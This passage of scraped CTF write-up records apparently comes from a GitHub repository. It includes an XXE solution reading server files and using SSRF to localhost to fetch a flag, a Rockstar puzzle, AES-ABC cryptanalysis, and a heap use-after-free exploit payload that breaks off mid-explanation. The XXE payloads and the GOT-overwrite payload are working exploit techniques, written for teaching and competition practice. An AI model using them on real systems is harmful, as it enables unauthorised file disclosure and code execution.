simplexml_load_string(): bad input in <b>/var/www/html/generate.php</b> on line <b>23</b><br />\r\n<br />\r\n<b>Warning</b>:  simplexml_load_string(): ^ in <b>/var/www/html/generate.php</b> on line <b>23</b><br />\r\nError parsing XML:\r\nbad input\r\n```\r\n\r\nThe server discloses the php file path - and we can try to read it:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\n<?xml version=\"1.0\"?>\r\n> <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/html/generate.php'>]>\r\n> <input><firstName>John</firstName><lastName>&test;</lastName></input>\r\n> TEXT\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <title>Wrestler Name Generator</title>\r\n  <meta charset=\"utf-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n  <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\">\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\"></script>\r\n  <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\"></script>\r\n</head>\r\n<body>\r\n\r\n<div class=\"jumbotron text-center\">\r\n  <h1>Your Wrestler Name Is:</h1>\r\n  <h2>John \"The Brute\"\r\n</h2>\r\n<!--hacker name functionality coming soon!-->\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n<!--<h2>Your Hacker Name Is: REDACTED</h2>-->\r\n  <a href=\"/\">Go Back</a>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nThis didn't work, but what if we try to base64 encode the file using PHP's filters?\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\n<?xml version=\"1.0\"?>\r\n> <!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/generate.php'>]>\r\n> <input><firstName>John</firstName><lastName>&test;</lastName></input>\r\n> TEXT\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <title>Wrestler Name Generator</title>\r\n  <meta charset=\"utf-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n  <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\">\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\"></script>\r\n  <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\"></script>\r\n</head>\r\n<body>\r\n\r\n<div class=\"jumbotron text-center\">\r\n  <h1>Your Wrestler Name Is:</h1>\r\n  <h2>John \"The Hacker\" PD9waHAKCiR3aGl0ZWxpc3QgPSBhcnJheSgKICAgICcxMjcuMC4wLjEnLAogICAgJzo6MScKKTsKLy8gaWYgdGhpcyBwYWdlIGlzIGFjY2Vzc2VkIGZyb20gdGhlIHdlYiBzZXJ2ZXIsIHRoZSBmbGFnIGlzIHJldHVybmVkCi8vIGZsYWcgaXMgaW4gZW52IHZhcmlhYmxlIHRvIGF2b2lkIHBlb3BsZSB1c2luZyBYWEUgdG8gcmVhZCB0aGUgZmxhZwovLyBSRU1PVEVfQUREUiBmaWVsZCBpcyBhYmxlIHRvIGJlIHNwb29mZWQgKHVubGVzcyB5b3UgYWxyZWFkeSBhcmUgb24gdGhlIHNlcnZlcikKaWYoaW5fYXJyYXkoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICR3aGl0ZWxpc3QpKXsKCWVjaG8gJF9FTlZbIkZMQUciXTsKCXJldHVybjsKfQovLyBtYWtlIHN1cmUgdGhlIGlucHV0IHBhcmFtZXRlciBleGlzdHMKaWYgKGVtcHR5KCRfR0VUWyJpbnB1dCJdKSkgewoJZWNobyAiUGxlYXNlIGluY2x1ZGUgdGhlICdpbnB1dCcgZ2V0IHBhcmFtZXRlciB3aXRoIHlvdXIgcmVxdWVzdCwgQnJvdGhlciI7CglyZXR1cm47Cn0KCi8vIGdldCBpbnB1dAokeG1sRGF0YSA9IGJhc2U2NF9kZWNvZGUoJF9HRVRbImlucHV0Il0pOwovLyBwYXJzZSB4bWwKJHhtbD1zaW1wbGV4bWxfbG9hZF9zdHJpbmcoJHhtbERhdGEsIG51bGwsIExJQlhNTF9OT0VOVCkgb3IgZGllKCJFcnJvciBwYXJzaW5nIFhNTDogIi4iXG4iLiR4bWxEYXRhKTsKJGZpcnN0TmFtZSA9ICR4bWwtPmZpcnN0TmFtZTsKJGxhc3ROYW1lID0gJHhtbC0+bGFzdE5hbWU7Ci8vIGdlbmVyYXRlIG5hbWUKJG5vdW5zID0gYXJyYXkoIktpbGxlciIsICJTYXZhZ2UiLCAiU3RhbGxpb24iLCAiQ29kZXIiLCAiSGFja2VyIiwgIlNsYXNoZXIiLCAiQ3J1c2hlciIsICJCYXJiYXJpYW4iLCAiRmVyb2Npb3VzIiwgIkZpZXJjZSIsICJWaWNpb3VzIiwgIkh1bnRlciIsICJCcnV0ZSIsICJUYWN0aWNpYW4iLCAiRXhwZXJ0Iik7CiRub3VuID0gJG5vdW5zW2FycmF5X3JhbmQoJG5vdW5zKV07CiRnZW5lcmF0ZWROYW1lID0gJGZpcnN0TmFtZS4nICJUaGUgJy4kbm91bi4nIiAnLiRsYXN0TmFtZTsKCi8vIHJldHVybiBodG1sIGZvciB0aGUgcmVzdWx0cyBwYWdlCmVjaG8gPDw8RU9UCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDx0aXRsZT5XcmVzdGxlciBOYW1lIEdlbmVyYXRvcjwvdGl0bGU+CiAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjMuMS9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjMuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTQuNy91bWQvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMy4xL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgoKPGRpdiBjbGFzcz0ianVtYm90cm9uIHRleHQtY2VudGVyIj4KICA8aDE+WW91ciBXcmVzdGxlciBOYW1lIElzOjwvaDE+CiAgPGgyPiRnZW5lcmF0ZWROYW1lPC9oMj4gCjwhLS1oYWNrZXIgbmFtZSBmdW5jdGlvbmFsaXR5IGNvbWluZyBzb29uIS0tPgo8IS0taWYgeW91J3JlIHRyeWluZyB0byB0ZXN0IHRoZSBoYWNrZXIgbmFtZSBmdW5jdGlvbmFsaXR5LCBtYWtlIHN1cmUgeW91J3JlIGFjY2Vzc2luZyB0aGlzIHBhZ2UgZnJvbSB0aGUgd2ViIHNlcnZlci0tPgo8IS0tPGgyPllvdXIgSGFja2VyIE5hbWUgSXM6IFJFREFDVEVEPC9oMj4tLT4KICA8YSBocmVmPSIvIj5HbyBCYWNrPC9hPiAKPC9kaXY+CjwvYm9keT4KPC9odG1sPgpFT1Q7Cj8+Cg==</h2>\r\n<!--hacker name functionality coming soon!-->\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n<!--<h2>Your Hacker Name Is: REDACTED</h2>-->\r\n  <a href=\"/\">Go Back</a>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nThat's more like it. The decoded text is:\r\n\r\n```php\r\n<?php\r\n\r\n$whitelist = array(\r\n    '127.0.0.1',\r\n    '::1'\r\n);\r\n// if this page is accessed from the web server, the flag is returned\r\n// flag is in env variable to avoid people using XXE to read the flag\r\n// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)\r\nif(in_array($_SERVER['REMOTE_ADDR'], $whitelist)){\r\n\techo $_ENV[\"FLAG\"];\r\n\treturn;\r\n}\r\n// make sure the input parameter exists\r\nif (empty($_GET[\"input\"])) {\r\n\techo \"Please include the 'input' get parameter with your request, Brother\";\r\n\treturn;\r\n}\r\n\r\n// get input\r\n$xmlData = base64_decode($_GET[\"input\"]);\r\n// parse xml\r\n$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(\"Error parsing XML: \".\"\\n\".$xmlData);\r\n$firstName = $xml->firstName;\r\n$lastName = $xml-\r\n```\r\n\r\nGood enough to point us in the right direction - we just have to access the page from within the server.\r\nIn retrospective - This should have been clear from the comment in the HTML file:\r\n```html\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n```\r\n\r\nAnyway, here's how to do it:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\n<?xml version=\"1.0\"?>\r\n> <!DOCTYPE root [<!ENTITY test SYSTEM 'http://127.0.0.1/generate.php'>]>\r\n> <input><firstName>John</firstName><lastName>&test;</lastName></input>\r\n> TEXT\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <title>Wrestler Name Generator</title>\r\n  <meta charset=\"utf-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n  <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\">\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\"></script>\r\n  <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\"></script>\r\n</head>\r\n<body>\r\n\r\n<div class=\"jumbotron text-center\">\r\n  <h1>Your Wrestler Name Is:</h1>\r\n  <h2>John \"The Coder\" sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</h2>\r\n<!--hacker name functionality coming soon!-->\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n<!--<h2>Your Hacker Name Is: REDACTED</h2>-->\r\n  <a href=\"/\">Go Back</a>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nThe flag: sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}", "timestamp": "2025-10-21T13:36:23.327270"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/1_wanna_b3_a_r0ck5tar.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/1_wanna_b3_a_r0ck5tar.md", "content": "# 1_wanna_b3_a_r0ck5tar\r\nGeneral Skills, 350 points\r\n\r\n## Description:\r\n> I wrote you another song. Put the flag in the picoCTF{} flag format\r\n\r\n```\r\nRocknroll is right              \r\nSilence is wrong                \r\nA guitar is a six-string        \r\nTommy's been down               \r\nMusic is a billboard-burning razzmatazz!\r\nListen to the music             \r\nIf the music is a guitar                  \r\nSay \"Keep on rocking!\"                \r\nListen to the rhythm\r\nIf the rhythm without Music is nothing\r\nTommy is rockin guitar\r\nShout Tommy!                    \r\nMusic is amazing sensation \r\nJamming is awesome presence\r\nScream Music!                   \r\nScream Jamming!                 \r\nTommy is playing rock           \r\nScream Tommy!       \r\nThey are dazzled audiences                  \r\nShout it!\r\nRock is electric heaven                     \r\nScream it!\r\nTommy is jukebox god            \r\nSay it!                                     \r\nBreak it down\r\nShout \"Bring on the rock!\"\r\nElse Whisper \"That ain't it, Chief\"                 \r\nBreak it down \r\n```\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [mus1c](mus1c.md).\r\n\r\nSame as before, we paste the program into the [online interpreter](https://codewithrockstar.com/online) and run it. However, this time the program asks for input. Entering a random string doesn't lead anywhere. We'll have to understand the program.\r\n\r\nWe can either choose to understand the [Language Specification](https://codewithrockstar.com/docs) or just use a [Python transpiler](https://github.com/yanorestes/rockstar-py) to translate the program to Python. Using the transpiler seems faster.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/1_wanna_b3_a_r0ck5tar# rockstar-py --output rockstar.py -i lyrics.txt\r\nroot@kali:/media/sf_CTFs/pico/1_wanna_b3_a_r0ck5tar# cat rockstar.py\r\nRocknroll = True\r\nSilence = False\r\na_guitar = 19\r\nTommy = 44\r\nMusic = 160\r\nthe_music = input()\r\nif the_music == a_guitar:\r\n    print(\"Keep on rocking!\")\r\n    the_rhythm = input()\r\n    if the_rhythm - Music == False:\r\n        Tommy = 66\r\n        print(Tommy!)\r\n        Music = 79\r\n        Jamming = 78\r\n        print(Music!)\r\n        print(Jamming!)\r\n        Tommy = 74\r\n        print(Tommy!)\r\n        They are dazzled audiences\r\n        print(it!)\r\n        Rock = 86\r\n        print(it!)\r\n        Tommy = 73\r\n        print(it!)\r\n        break\r\n        print(\"Bring on the rock!\")\r\n        Else print(\"That ain't it, Chief\")\r\n        break\r\n```\r\n\r\nThis code, of course, doesn't run:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/1_wanna_b3_a_r0ck5tar# python rockstar.py\r\n  File \"rockstar.py\", line 12\r\n    print(Tommy!)\r\n               ^\r\nSyntaxError: invalid syntax\r\n```\r\n\r\nFixing it a bit using some common sense, we get:\r\n\r\n```python\r\nRocknroll = True\r\nSilence = False\r\na_guitar = 19\r\nTommy = 44\r\nMusic = 160\r\nthe_music = input()\r\nif int(the_music) == a_guitar:\r\n    print(\"Keep on rocking!\")\r\n    the_rhythm = input()\r\n    if int(the_rhythm) - Music == 0:\r\n        Tommy = 66\r\n        print(Tommy)\r\n        Music = 79\r\n        Jamming = 78\r\n        print(Music)\r\n        print(Jamming)\r\n        Tommy = 74\r\n        print(Tommy)\r\n        #They are dazzled audiences\r\n        print(it)\r\n        Rock = 86\r\n        print(it)\r\n        Tommy = 73\r\n        print(it)\r\n        #break\r\n        print(\"Bring on the rock!\")\r\n    else:\r\n        print(\"That ain't it, Chief\")\r\n        #break\r\n```\r\n\r\nSo, in order to bypass the first condition, we should enter `19` as input for `the_music`.\r\n\r\nHowever, the official interpreter does not accept this, and it turns out the transpiler isn't decoding the language correctly.\r\n\r\nThis section explains how number literals are assigned.\r\n\r\n> #### Poetic Number Literals\r\n> \r\n> A poetic number literal begins with a variable name, followed by the keyword is, or the aliases was or were. As long as the next symbol is not a Literal Word, the rest of the line is treated as a decimal number in which the values of consecutive digits are given by the lengths of the subsequent barewords, up until the end of the line. To allow the digit zero, and to compensate for a lack of suitably rock’n’roll 1- and 2-letter words, word lengths are parsed modulo 10. A period (.) character denotes a decimal place. Other than the first period, any non-alphabetical characters are ignored.\r\n> \r\n>  *   Tommy was a lovestruck ladykiller initialises Tommy with the value 100\r\n>  *   Sweet Lucy was a dancer - initialises Sweet Lucy with the value 16\r\n\r\n\r\nTherefore, the following command:\r\n```\r\nA guitar is a six-string        \r\n```\r\n\r\nShould be considered 136, and not 19. Entering 136 indeed prints \"Keep on rocking!\" and brings us to the next input request.\r\n\r\nNow we need to enter the correct value for `the rhythm`, so that `the rhythm without Music is nothing`. \r\n\r\n`without` is a reserved word which indicates substraction:\r\n\r\n\r\n```\r\nOperator \tOperation \t    Aliases\r\n+ \t        addition \t    plus, with\r\n- \t        subtraction \tminus, without\r\n* \t        multiplication \ttimes, of\r\n/ \t        division \t    over\r\n```\r\n\r\n`nothing` is a reserved word which resembles zero:\r\n\r\n> Null - the null type. Evaluates as equal to zero and equal to false. The keywords nothing, nowhere, nobody, empty and gone are defined as aliases for null\r\n\r\nSo as the transpiler correctly identified, we need to enter a value for `the rhythm` so that `the rhythm - Music == 0`.\r\n\r\nAccording to the logic above, the value of `Music` is `a billboard-burning razzmatazz! == 1970`. Entering this gives us the following output in the online interpreter:\r\n\r\n```\r\nKeep on rocking!\r\n66\r\n79\r\n78\r\n74\r\n79\r\n86\r\n73\r\n```\r\n\r\nThis is pretty close to what the transpiler understood, only 79 is missing.\r\n\r\nIn any case, translated to ASCII, we get:\r\n\r\n```python\r\n>>> ascii = \"\"\"66\r\n... 79\r\n... 78\r\n... 74\r\n... 79\r\n... 86\r\n... 73\"\"\"\r\n>>> for c in ascii.split():\r\n...     print(chr(int(c)), end='')\r\n...\r\nBONJOVI\r\n```\r\n\r\nSo the flag is `picoCTF{BONJOVI}`.\r\n\r\n### Update (November 2020)\r\n\r\nIt seems as though the Rockstar language specs have changed since the original challange was posted, and the hyphen has received a special meaning:\r\n\r\n> The hyphen (-) is counted as a letter – so you can use terms like ‘all-consuming’ (13 letters > 3) and ‘power-hungry’ (12 letters > 2) instead of having to think of 12- and 13-letter words.\r\n\r\nTherefore, using the updated specs, `a six-string` should count as `10` and `a billboard-burning razzmatazz` now equals `170`.\r\n\r\nSee [here](https://github.com/Dvd848/CTFs/issues/8) and [here](https://github.com/Dvd848/CTFs/issues/9) for more details.\r\n\r\n", "timestamp": "2025-10-21T13:36:24.682265"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/AES-ABC.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/AES-ABC.md", "content": "# AES-ABC\r\nCryptography, 400 points\r\n\r\n## Description:\r\n> AES-ECB is bad, so I rolled my own cipher block chaining mechanism - Addition Block Chaining! You can find the source here: aes-abc.py. The AES-ABC flag is body.enc.ppm\r\n\r\n```python\r\n#!/usr/bin/env python\r\n\r\nfrom Crypto.Cipher import AES\r\nfrom key import KEY\r\nimport os\r\nimport math\r\n\r\nBLOCK_SIZE = 16\r\nUMAX = int(math.pow(256, BLOCK_SIZE))\r\n\r\n\r\ndef to_bytes(n):\r\n    s = hex(n)\r\n    s_n = s[2:]\r\n    if 'L' in s_n:\r\n        s_n = s_n.replace('L', '')\r\n    if len(s_n) % 2 != 0:\r\n        s_n = '0' + s_n\r\n    decoded = s_n.decode('hex')\r\n\r\n    pad = (len(decoded) % BLOCK_SIZE)\r\n    if pad != 0: \r\n        decoded = \"\\0\" * (BLOCK_SIZE - pad) + decoded\r\n    return decoded\r\n\r\n\r\ndef remove_line(s):\r\n    # returns the header line, and the rest of the file\r\n    return s[:s.index('\\n') + 1], s[s.index('\\n')+1:]\r\n\r\n\r\ndef parse_header_ppm(f):\r\n    data = f.read()\r\n\r\n    header = \"\"\r\n\r\n    for i in range(3):\r\n        header_i, data = remove_line(data)\r\n        header += header_i\r\n\r\n    return header, data\r\n        \r\n\r\ndef pad(pt):\r\n    padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE\r\n    return pt + (chr(padding) * padding)\r\n\r\n\r\ndef aes_abc_encrypt(pt):\r\n    cipher = AES.new(KEY, AES.MODE_ECB)\r\n    ct = cipher.encrypt(pad(pt))\r\n\r\n    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]\r\n    iv = os.urandom(16)\r\n    blocks.insert(0, iv)\r\n    \r\n    for i in range(len(blocks) - 1):\r\n        prev_blk = int(blocks[i].encode('hex'), 16)\r\n        curr_blk = int(blocks[i+1].encode('hex'), 16)\r\n\r\n        n_curr_blk = (prev_blk + curr_blk) % UMAX\r\n        blocks[i+1] = to_bytes(n_curr_blk)\r\n\r\n    ct_abc = \"\".join(blocks)\r\n \r\n    return iv, ct_abc, ct\r\n\r\n\r\nif __name__==\"__main__\":\r\n    with open('flag.ppm', 'rb') as f:\r\n        header, data = parse_header_ppm(f)\r\n    \r\n    iv, c_img, ct = aes_abc_encrypt(data)\r\n\r\n    with open('body.enc.ppm', 'wb') as fw:\r\n        fw.write(header)\r\n        fw.write(c_img)\r\n```\r\n\r\n## Solution: \r\n\r\nWe receive a `PPM` image file which is encrypted with `AES-ABC`: A layer of `AES-EBC` wrapped with an extra layer of custom encryption.\r\n\r\nThe `PPM` header (first 16 bytes) is left as-is, and only what comes after that is encrypted:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/AES-ABC# xxd body.enc.ppm | head\r\n00000000: 5036 0a31 3839 3520 3832 300a 3235 350a  P6.1895 820.255.\r\n00000010: cee8 bfc1 9950 7cb9 4946 bcc0 dae7 d1a1  .....P|.IF......\r\n00000020: 4f56 a5f1 a6b3 34cb daea 9886 70ca e5ac  OV....4.....p...\r\n00000030: cfc4 8c21 b415 ecde 6c8e 744c 06ad f9b7  ...!....l.tL....\r\n00000040: 5032 7251 c178 a4f0 fe32 5011 9c91 0dc2  P2rQ.x...2P.....\r\n00000050: d0a0 5881 cedb 5d03 8fd6 2bd7 3274 21cd  ..X...]...+.2t!.\r\n00000060: 510e 3eb1 dc3e 1516 217a 079c c857 35d8  Q.>..>..!z...W5.\r\n00000070: d17c 24e1 e9a0 cd28 b31d e362 5e3a 49e3  .|$....(...b^:I.\r\n00000080: 51ea 0b11 f703 853b 44c1 bf27 f41d 5dee  Q......;D..'..].\r\n00000090: d257 f142 0466 3d4d d665 9aed 8a00 71f9  .W.B.f=M.e....q.\r\n```\r\n\r\nLet's take a look at the encryption process:\r\n\r\n```python\r\ndef aes_abc_encrypt(pt):\r\n    cipher = AES.new(KEY, AES.MODE_ECB)\r\n    ct = cipher.encrypt(pad(pt))\r\n\r\n    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]\r\n    iv = os.urandom(16)\r\n    blocks.insert(0, iv)\r\n    \r\n    for i in range(len(blocks) - 1):\r\n        prev_blk = int(blocks[i].encode('hex'), 16)\r\n        curr_blk = int(blocks[i+1].encode('hex'), 16)\r\n\r\n        n_curr_blk = (prev_blk + curr_blk) % UMAX\r\n        blocks[i+1] = to_bytes(n_curr_blk)\r\n\r\n    ct_abc = \"\".join(blocks)\r\n \r\n    return iv, ct_abc, ct\r\n```\r\n\r\nThe plaintext is first encrypted using AES-ECB, which means that it is divided into 16-byte blocks and each block is encrypted independently using a secret key.\r\n\r\nThen, the AES-EBC ciphertext is divided (again) into 16 byte blocks. An IV is chosen, and set as the first block of the output. After that, the function iterates over the blocks of the AES-EBC ciphertext and for each block, calculates its sum together with the previous output block (modulus UMAX), and this is set as the current output block.\r\n\r\nTherefore, we can say that:\r\n```\r\nABC(0) = IV\r\nFor n=1..num_ebc_blocks: ABC(n+1) = ( EBC(n) + ABC(n) ) % UMAX\r\n```\r\n\r\nIt's a widely known fact that AES-EBC isn't secure, and one of the famous examples is related to the ability to extract significant details from a bitmap image even after encryption:\r\n\r\n> A striking example of the degree to which ECB can leave plaintext data patterns in the ciphertext can be seen when ECB mode is used to encrypt a bitmap image which uses large areas of uniform color. While the color of each individual pixel is encrypted, the overall image may still be discerned, as the pattern of identically colored pixels in the original remains in the encrypted version. (Source: Wikipedia)\r\n\r\nThe [Wikipedia article](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_(ECB)) contains a visualization of the problem - check it out.\r\n\r\nSo, if we can bring the ciphertext back to EBC form, we might be able to get the flag even without knowing the original EBC key.\r\n\r\nIn our case, it should be easy to reverse the ABC layer. We already know that `ABC(n+1) = ( EBC(n) + ABC(n) ) % UMAX`. Another way to write a modulus equation is `ECB(n) + ABC(n) = k*UMAX + ABC(n+1)` for some non-negative integer `k`, meaning `ECB(n) = ABC(n+1) - ABC(n) + k*UMAX`.\r\n\r\nWe also know that `UMAX` was defined as a tight upper bound for a single 16-byte value, meaning both `EBC(n)` and `ABC(n)` are under it, and `EBC(n) + ABC(n)` are bound by `2*UMAX`. Therefore, in our case, `k == 0 || k == 1`. If `k == 0` then `ECB(n) = ABC(n+1) - ABC(n)` and if `k == 1` then `ECB(n) = ABC(n+1) - ABC(n) + UMAX`. Knowing this, we can easily reverse the algorithm using the following script:\r\n\r\n```python\r\nimport sys\r\n\r\nclass key(object):\r\n    @staticmethod\r\n    def KEY():\r\n        return None\r\n\r\nif __name__ == \"__main__\":\r\n    sys.modules['key'] = key\r\n    from aes_abc import parse_header_ppm, to_bytes, BLOCK_SIZE, UMAX\r\n\r\n    with open('body.enc.ppm', 'rb') as f:\r\n        header, data = parse_header_ppm(f)\r\n        blocks = [data[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(data) / BLOCK_SIZE)]\r\n        new_blocks = []\r\n\r\n        for i in range(len(blocks) - 1):\r\n            prev_blk = int(blocks[i].encode('hex'), 16)\r\n            curr_blk = int(blocks[i+1].encode('hex'), 16)\r\n\r\n            n_curr_blk = (curr_blk - prev_blk)\r\n            if n_curr_blk < 0:\r\n                n_curr_blk += UMAX\r\n            new_blocks.append(to_bytes(n_curr_blk))\r\n\r\n        joined = \"\".join(new_blocks)\r\n        with open('ecb.ppm', 'wb') as fw:\r\n            fw.write(header)\r\n            fw.write(joined)\r\n```\r\n\r\nNotes:\r\n\r\n* We reuse logic from the original script. In order to do that without changing the original script, we must mock the `key` module which we don't have access to and don't need\r\n* We calculate `ECB(n) = ABC(n+1) - ABC(n)`. We add `UMAX` in case the result is negative (`ECB(n)` was originally non-negative). Under these circumstances, this is equivalent to calculating `n_curr_blk = (curr_blk - prev_blk) % UMAX`.\r\n\r\nAfter running the script, we get the following image:\r\n\r\n![](images/aesabc.png)\r\n\r\nThe flag: `picoCTF{d0Nt_r0ll_yoUr_0wN_aES}`.", "timestamp": "2025-10-21T13:36:24.790250"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/AfterLife.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/AfterLife.md", "content": "# AfterLife\r\nBinary Exploitation, 400 points\r\n\r\n## Description:\r\n> Just pwn this program and get a flag.\r\n\r\n```c\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <fcntl.h>\r\n#include <unistd.h>\r\n#define FLAG_BUFFER 200\r\n#define LINE_BUFFER_SIZE 20\r\n\r\nvoid win() {\r\n  char buf[FLAG_BUFFER];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  fgets(buf,FLAG_BUFFER,f);\r\n  fprintf(stdout,\"%s\\n\",buf);\r\n  fflush(stdout);\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord \r\n   char *first, *second, *third, *fourth;\r\n   char *fifth, *sixth, *seventh;\r\n   first=malloc(256);\r\n   printf(\"Oops! a new developer copy pasted and printed an address as a decimal...\\n\");\r\n   printf(\"%d\\n\",first);\r\n   strncpy(first,argv[1],LINE_BUFFER_SIZE);\r\n   second=malloc(256);\r\n   third=malloc(256);\r\n   fourth=malloc(256);\r\n   free(first);\r\n   free(third);\r\n   fifth=malloc(128);\r\n   puts(\"you will write on first after it was freed... an overflow will not be very useful...\");\r\n   gets(first);\r\n   seventh=malloc(256);\r\n   exit(0);\r\n}\r\n\r\n```\r\n\r\nHints:\r\n\r\n* If you understood the double free, a use after free should not be hard! http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf\r\n\r\n## Solution:\r\n\r\nAs mentioned in the comment, this is an artificial example taken from [Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137). A complete analysis of the example exists in the book, and this writeup is inspired by it.\r\n\r\nThe vulnerability here is *use after free*: \r\n\r\n```c\r\nfree(first); // <-- 'first' is freed\r\nfree(third);\r\nfifth=malloc(128);\r\nputs(\"you will write on first after it was freed... an overflow will not be very useful...\");\r\ngets(first); // <-- 'first' is used\r\n```\r\n\r\nThe setup is very similar to [SecondLife](SecondLife.md). This time, we are able to directly overwrite a chunk which is already located in one of the bins. We overwrite it with the exact same payload as before:\r\n\r\n```python\r\npayload = p32(exe.got[\"exit\"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols[\"win\"])))\r\n```\r\n\r\nThis will cause the buffer to look like:\r\n```\r\n                                Buffer                          Legend\r\n                                +------------------------+---+  +------------------------+---+\r\n                                | Size of chunk          | 0 |  | Size of chunk          | 0 |\r\nPointer returned by malloc -->  +------------------------+---+  +------------------------+---+\r\n                                | exe.got[\"exit\"] - 12       |  | Forward Pointer            |\r\n                                +----------------------------+  +----------------------------+\r\n                            +---| address + 8                |  | Back Pointer               |\r\n                            +-> +----------------------------+  +----------------------------+\r\n                                | push 'win'; ret;           |  | Unused                     |\r\n                                |                            |  |                            |\r\n                                +----------------------------+  +----------------------------+\r\n                                | Size of chunk              |  | Size of chunk          